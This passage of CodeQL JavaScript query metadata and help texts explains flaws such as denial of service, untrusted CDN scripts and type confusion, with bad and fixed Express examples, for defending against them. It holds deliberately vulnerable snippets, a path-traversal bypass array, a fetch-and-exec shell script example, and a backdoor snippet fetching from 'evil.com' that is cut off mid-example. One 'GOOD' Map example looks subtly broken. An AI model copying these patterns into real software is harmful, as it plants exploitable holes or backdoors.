        save(rootDir, req.query.path, req.body); // GOOD exception is caught below
        res.status(200);
        res.end();
      } catch (e) {
        res.status(500);
        res.end();
      }
    });

    ```

    ## References
    * Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-754/UnvalidatedDynamicMethodCall.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-754/UnvalidatedDynamicMethodCall.bqrs
  metadata:
    name: Unvalidated dynamic method call
    description: |-
      Calling a method with a user-controlled name may dispatch to
                    an unexpected target, which could cause an exception.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/unvalidated-dynamic-method-call
    tags: |-
      security
             external/cwe/cwe-754
  queryHelp: |
    # Unvalidated dynamic method call
    JavaScript makes it easy to look up object properties dynamically at runtime. In particular, methods can be looked up by name and then called. However, if the method name is user-controlled, an attacker could choose a name that makes the application invoke an unexpected method, which may cause a runtime exception. If this exception is not handled, it could be used to mount a denial-of-service attack.

    For example, there might not be a method of the given name, or the result of the lookup might not be a function. In either case the method call will throw a `TypeError` at runtime.

    Another, more subtle example is where the result of the lookup is a standard library method from `Object.prototype`, which most objects have on their prototype chain. Examples of such methods include `valueOf`, `hasOwnProperty` and `__defineSetter__`. If the method call passes the wrong number or kind of arguments to these methods, they will throw an exception.


    ## Recommendation
    It is best to avoid dynamic method lookup involving user-controlled names altogether, for instance by using a `Map` instead of a plain object.

    If the dynamic method lookup cannot be avoided, consider whitelisting permitted method names. At the very least, check that the method is an own property and not inherited from the prototype object. If the object on which the method is looked up contains properties that are not methods, you should additionally check that the result of the lookup is a function. Even if the object only contains methods, it is still a good idea to perform this check in case other properties are added to the object later on.


    ## Example
    In the following example, an HTTP request parameter `action` property is used to dynamically look up a function in the `actions` map, which is then invoked with the `payload` parameter as its argument.


    ```javascript
    var express = require('express');
    var app = express();

    var actions = {
      play(data) {
        // ...
      },
      pause(data) {
        // ...
      }
    }

    app.get('/perform/:action/:payload', function(req, res) {
      let action = actions[req.params.action];
      // BAD: `action` may not be a function
      res.end(action(req.params.payload));
    });

    ```
    The intention is to allow clients to invoke the `play` or `pause` method, but there is no check that `action` is actually the name of a method stored in `actions`. If, for example, `action` is `rewind`, `action` will be `undefined` and the call will result in a runtime error.

    The easiest way to prevent this is to turn `actions` into a `Map` and using `Map.prototype.has` to check whether the method name is valid before looking it up.


    ```javascript
    var express = require('express');
    var app = express();

    var actions = new Map();
    actions.set("play", function play(data) {
      // ...
    });
    actions.set("pause", function pause(data) {
      // ...
    });

    app.get('/perform/:action/:payload', function(req, res) {
      if (actions.has(req.params.action)) {
        if (typeof actions.get(req.params.action) === 'function'){
          let action = actions.get(req.params.action);
        }
        // GOOD: `action` is either the `play` or the `pause` function from above
        res.end(action(req.params.payload));
      } else {
        res.end("Unsupported action.");
      }
    });

    ```
    If `actions` cannot be turned into a `Map`, a `hasOwnProperty` check should be added to validate the method name:


    ```javascript
    var express = require('express');
    var app = express();

    var actions = {
      play(data) {
        // ...
      },
      pause(data) {
        // ...
      }
    }

    app.get('/perform/:action/:payload', function(req, res) {
      if (actions.hasOwnProperty(req.params.action)) {
        let action = actions[req.params.action];
        if (typeof action === 'function') {
          // GOOD: `action` is an own method of `actions`
          res.end(action(req.params.payload));
          return;
        }
      }
      res.end("Unsupported action.");
    });

    ```

    ## References
    * OWASP: [Denial of Service](https://www.owasp.org/index.php/Denial_of_Service).
    * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map).
    * MDN: [Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype).
    * Common Weakness Enumeration: [CWE-754](https://cwe.mitre.org/data/definitions/754.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-770/MissingRateLimiting.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-770/MissingRateLimiting.bqrs
  metadata:
    name: Missing rate limiting
    description: |-
      An HTTP request handler that performs expensive operations without
                    restricting the rate at which operations can be carried out is vulnerable
                    to denial-of-service attacks.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/missing-rate-limiting
    tags: |-
      security
             external/cwe/cwe-770
             external/cwe/cwe-307
             external/cwe/cwe-400
  queryHelp: |
    # Missing rate limiting
    HTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.


    ## Recommendation
    A rate-limiting middleware should be used to prevent such attacks.


    ## Example
    The following example shows an Express application that serves static files without rate limiting:


    ```javascript
    var express = require('express');
    var app = express();

    app.get('/:path', function(req, res) {
      let path = req.params.path;
      if (isValidPath(path))
        res.sendFile(path);
    });

    ```
    To prevent denial-of-service attacks, the `express-rate-limit` package can be used:


    ```javascript
    var express = require('express');
    var app = express();

    // set up rate limiter: maximum of five requests per minute
    var RateLimit = require('express-rate-limit');
    var limiter = RateLimit({
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 100, // max 100 requests per windowMs
    });

    // apply rate limiter to all requests
    app.use(limiter);

    app.get('/:path', function(req, res) {
      let path = req.params.path;
      if (isValidPath(path))
        res.sendFile(path);
    });

    ```

    ## References
    * OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).
    * Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).
    * NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).
    * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).
    * Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-770/ResourceExhaustion.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-770/ResourceExhaustion.bqrs
  metadata:
    name: Resource exhaustion
    description: |-
      Allocating objects or timers with user-controlled
                    sizes or durations can cause resource exhaustion.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    id: js/resource-exhaustion
    precision: high
    tags: |-
      security
             external/cwe/cwe-400
             external/cwe/cwe-770
  queryHelp: "# Resource exhaustion\nApplications are constrained by how many resources\
    \ they can make use of. Failing to respect these constraints may cause the application\
    \ to be unresponsive or crash. It is therefore problematic if attackers can control\
    \ the sizes or lifetimes of allocated objects.\n\n\n## Recommendation\nEnsure\
    \ that attackers can not control object sizes and their lifetimes. If object sizes\
    \ and lifetimes must be controlled by external parties, ensure you restrict the\
    \ object sizes and lifetimes so that they are within acceptable ranges.\n\n\n\
    ## Example\nThe following example allocates a buffer with a user-controlled size.\n\
    \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
    \nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url,\
    \ true).query.size);\n\n\tlet buffer = Buffer.alloc(size); // BAD\n\n\t// ...\
    \ use the buffer\n});\n```\nThis is problematic since an attacker can choose a\
    \ size that makes the application run out of memory. Even worse, in older versions\
    \ of Node.js, this could leak confidential memory. To prevent such attacks, limit\
    \ the buffer size:\n\n\n```javascript\nvar http = require(\"http\"),\n    url\
    \ = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\
    \tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024)\
    \ {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t\
    }\n\n\tlet buffer = Buffer.alloc(size); // GOOD\n\n\t// ... use the buffer\n});\n\
    ```\n\n## Example\nAs another example, consider an application that allocates\
    \ an array with a user-controlled size, and then fills it with values:\n\n\n```javascript\n\
    var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
    \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet\
    \ dogs = new Array(size).fill(\"dog\"); // BAD\n\n\t// ... use the dog\n});\n\
    ```\nThe allocation of the array itself is not problematic since arrays are allocated\
    \ sparsely, but the subsequent filling of the array will take a long time, causing\
    \ the application to be unresponsive, or even run out of memory. Again, a limit\
    \ on the size will prevent the attack:\n\n\n```javascript\nvar http = require(\"\
    http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
    \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif\
    \ (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\
    \t\treturn;\n\t}\n\n\tlet dogs = new Array(size).fill(\"dog\"); // GOOD\n\n\t\
    // ... use the dogs\n});\n```\n\n## Example\nFinally, the following example lets\
    \ a user choose a delay after which a function is executed:\n\n\n```javascript\n\
    var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
    \ res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\t\
    setTimeout(f, delay); // BAD\n\n});\n\n```\nThis is problematic because a large\
    \ delay essentially makes the application wait indefinitely before executing the\
    \ function. Repeated registrations of such delays will therefore use up all of\
    \ the memory in the application. A limit on the delay will prevent the attack:\n\
    \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
    \nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url,\
    \ true).query.delay);\n\n\tif (delay > 1000) {\n\t\tres.statusCode = 400;\n\t\t\
    res.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tsetTimeout(f, delay); // GOOD\n\
    \n});\n\n```\n\n## References\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n\
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n\
    * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-776/XmlBomb.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-776/XmlBomb.bqrs
  metadata:
    name: XML internal entity expansion
    description: |-
      Parsing user input as an XML document with arbitrary internal
                    entity expansion is vulnerable to denial-of-service attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/xml-bomb
    tags: |-
      security
             external/cwe/cwe-776
             external/cwe/cwe-400
  queryHelp: |
    # XML internal entity expansion
    Parsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.

    In XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.

    If untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.


    ## Recommendation
    The safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxmljs` (though not its SAX parser API), disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action is needed.


    ## Example
    The following example uses the XML parser provided by the `node-expat` package to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to a DoS attack, since `node-expat` expands internal entities by default:


    ```javascript
    const app = require("express")(),
      expat = require("node-expat");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        parser = new expat.Parser();
      parser.on("startElement", handleStart);
      parser.on("text", handleText);
      parser.write(xmlSrc);
    });

    ```
    At the time of writing, `node-expat` does not provide a way of controlling entity expansion, but the example could be rewritten to use the `sax` package instead, which only expands standard entities such as `&amp;`:


    ```javascript
    const app = require("express")(),
      sax = require("sax");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        parser = sax.parser(true);
      parser.onopentag = handleStart;
      parser.ontext = handleText;
      parser.write(xmlSrc);
    });

    ```

    ## References
    * Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).
    * Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).
    * Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-807/ConditionalBypass.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-807/ConditionalBypass.bqrs
  metadata:
    name: User-controlled bypass of security check
    description: Conditions that the user controls are not suited for making security-related
      decisions.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: medium
    id: js/user-controlled-bypass
    tags: |-
      security
             external/cwe/cwe-807
             external/cwe/cwe-290
  queryHelp: |
    # User-controlled bypass of security check
    Using user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.


    ## Recommendation
    When checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.

    Similarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.


    ## Example
    In this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.


    ```javascript
    var express = require('express');
    var app = express();
    // ...
    app.get('/full-profile/:userId', function(req, res) {

        if (req.cookies.loggedInUserId !== req.params.userId) {
            // BAD: login decision made based on user controlled data
            requireLogin();
        } else {
            // ... show private information
        }

    });

    ```
    This security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:


    ```javascript
    var express = require('express');
    var app = express();
    // ...
    app.get('/full-profile/:userId', function(req, res) {

        if (req.signedCookies.loggedInUserId !== req.params.userId) {
            // GOOD: login decision made based on server controlled data
            requireLogin();
        } else {
            // ... show private information
        }

    });

    ```

    ## References
    * Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).
    * Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-829/InsecureDownload.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-829/InsecureDownload.bqrs
  metadata:
    name: Download of sensitive file through insecure connection
    description: |-
      Downloading executables and other sensitive files over an insecure connection
                    opens up for potential man-in-the-middle attacks.
    kind: path-problem
    problem.severity: error
    security-severity: 8.1
    precision: high
    id: js/insecure-download
    tags: |-
      security
             external/cwe/cwe-829
  queryHelp: |
    # Download of sensitive file through insecure connection
    Downloading executables or other sensitive files over an unencrypted connection can leave a server open to man-in-the-middle attacks (MITM). Such an attack can allow an attacker to insert arbitrary content into the downloaded file, and in the worst case, allow the attacker to execute arbitrary code on the vulnerable system.


    ## Recommendation
    Use a secure transfer protocol when downloading executables or other sensitive files.


    ## Example
    In this example, a server downloads a shell script from a remote URL using the `node-fetch` library, and then executes this shell script.


    ```javascript
    const fetch = require("node-fetch");
    const cp = require("child_process");

    fetch('http://mydownload.example.org/myscript.sh')
        .then(res => res.text())
        .then(script => cp.execSync(script));
    ```
    The HTTP protocol is vulnerable to MITM, and thus an attacker could potentially replace the downloaded shell script with arbitrary code, which gives the attacker complete control over the system.

    The issue has been fixed in the example below by replacing the HTTP protocol with the HTTPS protocol.


    ```javascript
    const fetch = require("node-fetch");
    const cp = require("child_process");

    fetch('https://mydownload.example.org/myscript.sh')
        .then(res => res.text())
        .then(script => cp.execSync(script));
    ```

    ## References
    * Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
    * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-830/FunctionalityFromUntrustedDomain.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-830/FunctionalityFromUntrustedDomain.bqrs
  metadata:
    name: Untrusted domain used in script or other content
    description: Using a resource from an untrusted or compromised domain makes your
      code vulnerable to receiving malicious code.
    kind: problem
    security-severity: 7.2
    problem.severity: error
    id: js/functionality-from-untrusted-domain
    precision: high
    tags: |-
      security
             external/cwe/cwe-830
  queryHelp: |
    # Untrusted domain used in script or other content
    Content Delivery Networks (CDNs) are used to deliver content to users quickly and efficiently. However, they can change hands or be operated by untrustworthy owners, risking the security of the sites that use them. Some CDN domains are operated by entities that have used CDNs to deliver malware, which this query identifies.

    For example, `polyfill.io` was a popular JavaScript CDN, used to support new web browser standards on older browsers. In February 2024 the domain was sold, and in June 2024 it was publicised that the domain had been used to serve malicious scripts. It was taken down later in that month, leaving a window where sites that used the service could have been compromised. The same operator runs several other CDNs, undermining trust in those too.

    Including a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element) on a page, it is important to ensure that the received data is not malicious.

    Even when `https` is used, an untrustworthy operator might deliver malware.

    See the \[\`CUSTOMIZING.md\`\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of untrusted domains used by this query.


    ## Recommendation
    Carefully research the ownership of a Content Delivery Network (CDN) before using it in your application.

    If you find code that originated from an untrusted domain in your application, you should review your logs to check for compromise.

    To help mitigate the risk of including a script that could be compromised in the future, consider whether you need to use polyfill or another library at all. Modern browsers do not require a polyfill, and other popular libraries were made redundant by enhancements to HTML 5.

    If you do need a polyfill service or library, move to using a CDN that you trust.

    When you use a `script` or `link` element, you should check for [subresource integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity), and pin to a hash of a version of the service that you can trust (for example, because you have audited it for security and unwanted features). A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as hashes for the content required for the major browsers used by your users.

    You can also choose to self-host an uncompromised version of the service or library.


    ## Example
    The following example loads the Polyfill.io library from the `polyfill.io` CDN. This use was open to malicious scripts being served by the CDN.


    ```html
    <html>
        <head>
            <title>Polyfill.io demo</title>
            <script src="https://cdn.polyfill.io/v2/polyfill.min.js" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```
    Instead, load the Polyfill library from a trusted CDN, as in the next example:


    ```html
    <html>
        <head>
            <title>Polyfill demo - Cloudflare hosted with pinned version (but no integrity checking, since it is dynamically generated)</title>
            <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```
    If you know which browsers are used by the majority of your users, you can list the hashes of the polyfills for those browsers:


    ```html
    <html>
        <head>
            <title>Polyfill demo - Cloudflare hosted with pinned version (with integrity checking for a *very limited* browser set - just an example!)</title>
            <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0" integrity="sha384-i0IGVuZBkKZqwXTD4CH4kcksIbFx7WKFMdxN8zUhLFHpLdELF0ym0jxa6UvLhW8/ sha384-3d4jRKquKl90C9aFG+eH4lPJmtbPHgACWHrp+VomFOxF8lzx2jxqeYkhpRg18UWC" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```

    ## References
    * Sansec: [Polyfill supply chain attack hits 100K+ sites](https://sansec.io/research/polyfill-supply-chain-attack)
    * Cloudflare: [Upgrade the web. Automatically. Delivers only the polyfills required by the user's web browser.](https://cdnjs.cloudflare.com/polyfill)
    * Fastly: [New options for Polyfill.io users](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540)
    * Wikipedia: [Polyfill (programming)](https://en.wikipedia.org/wiki/Polyfill_(programming))
    * MDN Web Docs: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
    * Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-830/FunctionalityFromUntrustedSource.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-830/FunctionalityFromUntrustedSource.bqrs
  metadata:
    name: Inclusion of functionality from an untrusted source
    description: |-
      Including functionality from an untrusted source may allow
                    an attacker to control the functionality and execute arbitrary code.
    kind: problem
    problem.severity: warning
    security-severity: 6.0
    precision: high
    id: js/functionality-from-untrusted-source
    tags: |-
      security
             external/cwe/cwe-830
  queryHelp: |
    # Inclusion of functionality from an untrusted source
    Including a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.

    When including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.

    Even when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.

    Subresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.

    A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.

    See the \[\`CUSTOMIZING.md\`\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.


    ## Recommendation
    When an `iframe` element is used to embed a page, it is important to use an `https` URL.

    When using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.


    ## Example
    The following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.


    ```html
    <html>
        <head>
            <title>jQuery demo</title>
            <script src="http://code.jquery.com/jquery-3.6.0.slim.min.js" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```
    Instead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.


    ```html
    <html>
        <head>
            <title>jQuery demo</title>
            <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```

    ## References
    * MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
    * Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)
    * Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-834/LoopBoundInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-834/LoopBoundInjection.bqrs
  metadata:
    name: Loop bound injection
    description: |-
      Iterating over an object with a user-controlled .length
                    property can cause indefinite looping.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    id: js/loop-bound-injection
    tags: |-
      security
             external/cwe/cwe-834
             external/cwe/cwe-730
    precision: high
  queryHelp: "# Loop bound injection\nUsing the `.length` property of an untrusted\
    \ object as a loop bound may cause indefinite looping since a malicious attacker\
    \ can set the `.length` property to a very large number. For example, when a program\
    \ that expects an array is passed a JSON object such as `{length: 1e100}`, the\
    \ loop will be run for 10<sup>100</sup> iterations. This may cause the program\
    \ to hang or run out of memory, which can be used to mount a denial-of-service\
    \ (DoS) attack.\n\n\n## Recommendation\nEither check that the object is indeed\
    \ an array or limit the size of the `.length` property.\n\n\n## Example\nIn the\
    \ example below, an HTTP request handler iterates over a user-controlled object\
    \ `obj` using the `obj.length` property in order to copy the elements from `obj`\
    \ to an array.\n\n\n```javascript\nvar express = require('express');\nvar app\
    \ = express();\n\napp.post(\"/foo\", (req, res) => {\n    var obj = req.body;\n\
    \n    var ret = [];\n\n    // Potential DoS if obj.length is large.\n    for (var\
    \ i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n```\n\
    This is not secure since an attacker can control the value of `obj.length`, and\
    \ thereby cause the loop to iterate indefinitely. Here the potential DoS is fixed\
    \ by enforcing that the user-controlled object is an array.\n\n\n```javascript\n\
    var express = require('express');\nvar app = express();\n\napp.post(\"/foo\",\
    \ (req, res) => {\n    var obj = req.body;\n    \n    if (!(obj instanceof Array))\
    \ { // Prevents DoS.\n        return [];\n    }\n\n    var ret = [];\n\n    for\
    \ (var i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n\
    ```\n\n## References\n* Common Weakness Enumeration: [CWE-834](https://cwe.mitre.org/data/definitions/834.html).\n\
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-843/TypeConfusionThroughParameterTampering.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-843/TypeConfusionThroughParameterTampering.bqrs
  metadata:
    name: Type confusion through parameter tampering
    description: Sanitizing an HTTP request parameter may be ineffective if the user
      controls its type.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/type-confusion-through-parameter-tampering
    tags: |-
      security
             external/cwe/cwe-843
  queryHelp: |
    # Type confusion through parameter tampering
    Sanitizing untrusted HTTP request parameters is a common technique for preventing injection attacks such as SQL injection or path traversal. This is sometimes done by checking if the request parameters contain blacklisted substrings.

    However, sanitizing request parameters assuming they have type `String` and using the builtin string methods such as `String.prototype.indexOf` is susceptible to type confusion attacks. In a type confusion attack, an attacker tampers with an HTTP request parameter such that it has a value of type `Array` instead of the expected type `String`. Furthermore, the content of the array has been crafted to bypass sanitizers by exploiting that some identically named methods of strings and arrays behave differently.


    ## Recommendation
    Check the runtime type of sanitizer inputs if the input type is user-controlled.

    An even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.


    ## Example
    For example, Node.js server frameworks usually present request parameters as strings. But if an attacker sends multiple request parameters with the same name, then the request parameter is represented as an array instead.

    In the following example, a sanitizer checks that a path does not contain the `".."` string, which would allow an attacker to access content outside a user-accessible directory.


    ```javascript
    var app = require("express")(),
      path = require("path");

    app.get("/user-files", function(req, res) {
      var file = req.param("file");
      if (file.indexOf("..") !== -1) {
        // BAD
        // we forbid relative paths that contain ..
        // as these could leave the public directory
        res.status(400).send("Bad request");
      } else {
        var absolute = path.resolve("/public/" + file);
        console.log("Sending file: %s", absolute);
        res.sendFile(absolute);
      }
    });

    ```
    As written, this sanitizer is ineffective: an array like `["../", "/../secret.txt"]` will bypass the sanitizer. The array does not contain `".."` as an element, so the call to `indexOf` returns `-1` . This is problematic since the value of the `absolute` variable then ends up being `"/secret.txt"`. This happens since the concatenation of `"/public/"` and the array results in `"/public/../,/../secret.txt"`, which the `resolve`-call converts to `"/secret.txt"`.

    To fix the sanitizer, check that the request parameter is a string, and not an array:


    ```javascript
    var app = require("express")(),
      path = require("path");

    app.get("/user-files", function(req, res) {
      var file = req.param("file");
      if (typeof file !== 'string' || file.indexOf("..") !== -1) {
        // GOOD
        // we forbid relative paths that contain ..
        // as these could leave the public directory
        res.status(400).send("Bad request");
      } else {
        var absolute = path.resolve("/public/" + file);
        console.log("Sending file: %s", absolute);
        res.sendFile(absolute);
      }
    });

    ```

    ## References
    * Node.js API: [querystring](https://nodejs.org/api/querystring.html).
    * Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-862/EmptyPasswordInConfigurationFile.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-862/EmptyPasswordInConfigurationFile.bqrs
  metadata:
    name: Empty password in configuration file
    description: Failing to set a password reduces the security of your code.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: medium
    id: js/empty-password-in-configuration-file
    tags: |-
      security
             external/cwe/cwe-258
             external/cwe/cwe-862
  queryHelp: |
    # Empty password in configuration file
    The use of an empty string as a password in a configuration file is not secure.


    ## Recommendation
    Choose a strong password and encrypt it if it has to be stored in a configuration file.


    ## References
    * Common Weakness Enumeration: [CWE-258](https://cwe.mitre.org/data/definitions/258.html).
    * Common Weakness Enumeration: [CWE-862](https://cwe.mitre.org/data/definitions/862.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-912/HttpToFileAccess.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-912/HttpToFileAccess.bqrs
  metadata:
    name: Network data written to file
    description: Writing network data directly to the file system allows arbitrary
      file upload and might indicate a backdoor.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.3
    precision: medium
    id: js/http-to-file-access
    tags: |-
      security
             external/cwe/cwe-912
             external/cwe/cwe-434
  queryHelp: |
    # Network data written to file
    Storing user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


    ## Recommendation
    Examine the highlighted code closely to ensure that it is behaving as intended.


    ## Example
    The following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.


    ```javascript
    var https = require("https");
    var fs = require("fs");

    https.get('https://evil.com/script', res => {
      res.on("data", d => {
